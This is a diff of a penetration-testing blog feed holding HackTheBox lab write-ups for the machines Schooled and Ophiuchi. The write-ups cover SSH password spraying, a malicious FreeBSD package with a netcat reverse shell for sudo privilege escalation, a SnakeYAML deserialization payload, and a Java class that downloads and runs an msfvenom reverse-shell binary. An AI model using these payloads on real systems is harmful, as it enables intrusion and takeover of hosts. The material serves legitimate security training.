+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+</code></pre></div><h4 id="ssh">SSH</h4>
+<p>Now I can login as jamie via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «schooled» «10.10.14.49» 
+$ ssh jamie@10.10.10.234
+The authenticity of host <span class="s1">&#39;10.10.10.234 (10.10.10.234)&#39;</span> can<span class="s1">&#39;t be established.
+</span><span class="s1">ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc.
+</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="s1">Warning: Permanently added &#39;</span>10.10.10.234<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+Password <span class="k">for</span> jamie@Schooled:
+Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
+FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>
+
+...&lt;SNIP&gt;...
+
+jamie@Schooled:~ $ id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
+User jamie may run the following commands on Schooled:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
+</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
+<h4 id="malicious-package">Malicious package</h4>
+<p>With <code>fpm</code> installed, I can create a malicious package that contains a reverse shell using reference from GTFOBins.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
+/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
+        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
+</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
+Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
+</code></pre></div><p>I will transfer the package to Schooled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
+</code></pre></div><p>On Schooled:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
+Connection from 10.10.14.49 <span class="m">60744</span> received!
+jamie@Schooled:~ $
+</code></pre></div><p>I will setup a Netcat listener and start to install the malicious package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
+Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
+The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:
+
+New packages to be INSTALLED:
+        x: 1.0
+
+Number of packages to be installed: <span class="m">1</span>
+<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
+</code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
+<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
+root
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
+Schooled
+2462d8e2125d2a0
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Gobox</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
@@ -1429,375 +1881,6 @@ root@thenotebook:~#
 <ul>
 <li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
 <li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Ophiuchi</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</link>
-      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</guid>
-      <description>Deserialization attack on YAML and reversing web assembly</description>
-      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to a deserialization attack. Exploiting the vulnerability results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>YAML deserialization attack</li>
-<li>Web Assembly (WASM)</li>
-<li>Code Analysis (Go &amp; WASM)</li>
-<li>Sudo exploitation</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Java Compiler</li>
-<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
-<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ophiuchi» «10.10.14.53» 
-$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.227
-Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-Reason: <span class="m">65533</span> resets
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
-8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>
-
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds
-
-→ root@kali «ophiuchi» «10.10.14.53» 
-$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.227
-Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-8080/tcp open  http    Apache Tomcat 9.0.38
-<span class="p">|</span>_http-title: Parse YAML
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
-<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
-<p><div class="img-container"><img src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  /></div>
-</p>
-<p>When I submit a sample YAML payload, it returns the following message.</p>
-<p><div class="img-container"><img src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  /></div>
-</p>
-<p>But, if I send an invalid payload, for example:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">test: test
-  test: test
-</code></pre></div><p>I get the following results:</p>
-<p><div class="img-container"><img src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  /></div>
-</p>
-<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-tomcat">Shell as tomcat</h3>
-<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
-<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
-<p>Searching on Google about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a>. This is exactly what I need. I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
-</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
-</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="p">]]</span><span class="w">
-</span><span class="w"></span><span class="p">]</span><span class="w">
-</span></code></pre></div><p>On my listener, I get the following request.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ophiuchi» «10.10.14.23» 
-$ nc -nvlp <span class="m">80</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
-GET /iamf HTTP/1.1
-User-Agent: Java/11.0.8
-Host: 10.10.14.23
-Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
-Connection: keep-alive
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  /></div>
-</p>
-<p>That means the parser is vulnerable to insecure deserialization attack!</p>
-<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
-<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
-Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
-remote: Enumerating objects: 10, <span class="k">done</span>.
-remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
-Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
-</code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>
-
-    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-    
-<span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
-<span class="o">}</span>
-
-</code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
-$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
-Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
-adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
-adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
-Total:
-------
-<span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
-</code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
-<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: <span class="m">74</span> bytes
-Final size of elf file: <span class="m">194</span> bytes
-Saved as: iamf-shell
-</code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
-</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
-</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="p">]]</span><span class="w">
-</span><span class="w"></span><span class="p">]</span><span class="w">
-</span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
-<p><div class="img-container"><img src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  /></div>
-</p>
-<h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>As usual, I will do the PTY trick to upgrade my shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which script
-/usr/bin/script                                                     
-script /dev/null -c bash                                            
-Script started, file is /dev/null                                   
-tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-tomcat@ophiuchi:/$ ^Z 
-<span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «exploits» «10.10.14.23» 
-$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
-<span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>
-
-tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-admin">Shell as admin</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
-root:x:0:0:root:/root:/bin/bash
-admin:x:1000:1000:,,,:/home/admin:/bin/bash
-</code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
-<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ ssh admin@10.10.10.227 
-admin@10.10.10.227<span class="err">&#39;</span>s password: 
-Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-  System load:             0.08
-  Usage of /:              19.9% of 27.43GB
-  Memory usage:            17%
-  Swap usage:              0%
-  Processes:               <span class="m">214</span>
-  Users logged in:         <span class="m">0</span>
-  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
-  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf
-
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
-admin@ophiuchi:~$ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
-</code></pre></div><p>User flag is done here.</p>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="enumeration-2">Enumeration</h4>
-<p>User <code>admin</code> is allowed to run a Go program as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:~$ sudo -l
-Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User admin may run the following commands on ophiuchi:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
-</code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
-<p>What <code>index.go</code> does is:</p>
-<ul>
-<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
-<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
-
-<span class="kn">import</span> <span class="p">(</span>
-        <span class="s">&#34;fmt&#34;</span>
-        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
-        <span class="s">&#34;os/exec&#34;</span>
-        <span class="s">&#34;log&#34;</span>
-<span class="p">)</span>
-
-
-<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>
-
